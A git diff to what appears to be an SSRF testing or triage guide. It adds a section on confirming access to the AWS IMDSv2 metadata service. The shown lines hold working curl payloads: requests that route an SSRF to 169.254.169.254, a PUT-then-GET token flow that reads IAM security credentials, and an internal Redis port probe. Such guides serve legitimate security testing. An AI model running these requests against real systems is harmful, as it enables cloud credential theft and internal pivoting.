@@ -376,6 +376,17 @@ curl "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/
 # Expect: IAM role name or instance metadata in response body
 ```
 
+**AWS IMDSv2 (token-required, now the default)** — IMDSv1 above returns 401 on IMDSv2-only hosts. Confirmation needs the two-step token flow, which only works if the SSRF primitive can send a `PUT` and custom headers (e.g. a full request-forging gadget):
+```bash
+# 1) Obtain a session token (PUT with TTL header)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+# 2) Use it to read credentials
+curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
+  -H "X-aws-ec2-metadata-token: $TOKEN"
+# A GET-only SSRF that cannot set the token header cannot reach IMDSv2 — note this in triage.
+```
+
 **Internal pivot / port probe**
 ```bash
 curl "https://app.example.com/proxy?url=http://127.0.0.1:6379/"
